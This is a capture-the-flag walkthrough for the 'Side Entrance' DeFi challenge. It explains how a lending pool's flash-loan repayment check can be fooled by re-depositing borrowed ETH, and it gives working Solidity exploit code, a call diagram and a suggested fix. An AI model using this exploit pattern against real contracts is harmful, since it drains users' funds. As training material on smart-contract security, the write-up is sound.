## Challenge 4 Walkthrough: Side Entrance

### Vulnerability

The vulnerability lies in `SideEntranceLenderPool.flashLoan()`'s repayment check:

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    if (address(this).balance < balanceBefore) revert RepayFailed();
}
```

The check only verifies that `address(this).balance` has not decreased — it does not verify **how** the balance was restored. The pool also exposes a `deposit()` function:

```solidity
function deposit() external payable {
    unchecked { balances[msg.sender] += msg.value; }
    emit Deposit(msg.sender, msg.value);
}
```

These two functions create a contradiction:
- `flashLoan()` sends ETH out and checks the pool's raw ETH balance on return
- `deposit()` accepts ETH and credits the caller's internal `balances[]` entry
- Depositing borrowed ETH during the flash loan callback **satisfies the balance check** while simultaneously **crediting the attacker's withdrawable balance**

The pool treats a deposit as valid loan repayment — but the deposited ETH is now owed back to the depositor, not returned to the pool as a lender.

### Exploit

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
    exploit.attack(ETHER_IN_POOL);
}
```

Three functions on the exploit contract execute the full attack atomically:

**`attack()`** — orchestrates the sequence:
```solidity
function attack(uint256 amount) external payable {
    pool.flashLoan(amount);   // Step 1: borrow all 1000 ETH
    pool.withdraw();          // Step 3: pull out deposited ETH
    payable(recovery).transfer(address(this).balance); // Step 4: send to recovery
}
```

**`execute()`** — the flash loan callback, called by the pool mid-loan:
```solidity
function execute() external payable {
    pool.deposit{value: msg.value}(); // Step 2: re-deposit borrowed ETH
}
```

The full sequence within one transaction:

```
exploit.attack(1000 ETH)
    │
    ├─> pool.flashLoan(1000 ETH)
    │       │
    │       ├─ pool sends 1000 ETH to exploit
    │       ├─> exploit.execute() called by pool
    │       │       └─ pool.deposit(1000 ETH)
    │       │               └─ balances[exploit] += 1000 ETH
    │       └─ balance check: address(pool).balance == 1000 ETH ✓ (passes)
    │
    ├─> pool.withdraw()
    │       └─ sends balances[exploit] = 1000 ETH back to exploit
    │
    └─> recovery.transfer(1000 ETH)
```

- **Step 1** — `flashLoan(1000 ETH)` sends all pool ETH to the exploit contract and triggers `execute()`
- **Step 2** — inside `execute()`, the borrowed ETH is deposited back via `deposit()` — pool's raw balance returns to 1000 ETH, passing the repayment check, and `balances[exploit]` is now credited 1000 ETH
- **Step 3** — after the flash loan returns, `withdraw()` pays out `balances[exploit]` — the pool sends 1000 ETH back to the exploit contract
- **Step 4** — `recovery.transfer()` forwards all ETH to the recovery address

### Why It Works

The root cause is that the pool conflates two separate accounting systems:

- **Raw ETH balance** (`address(this).balance`) — used by `flashLoan()` to verify repayment
- **Internal deposit ledger** (`balances[]`) — used by `deposit()` and `withdraw()` to track ownership

Depositing during a flash loan satisfies the first check while creating a liability in the second. The pool has no mechanism to detect that the ETH "returned" via deposit is the same ETH that was just borrowed — it still owes it back to the depositor.

A correct implementation would track the flash loan balance separately from deposits, or disallow `deposit()` calls during an active flash loan via a reentrancy guard scoped to both functions.

This is a **flash loan reentrancy via deposit** vulnerability — one transaction, no initial capital required beyond gas, pool fully drained.
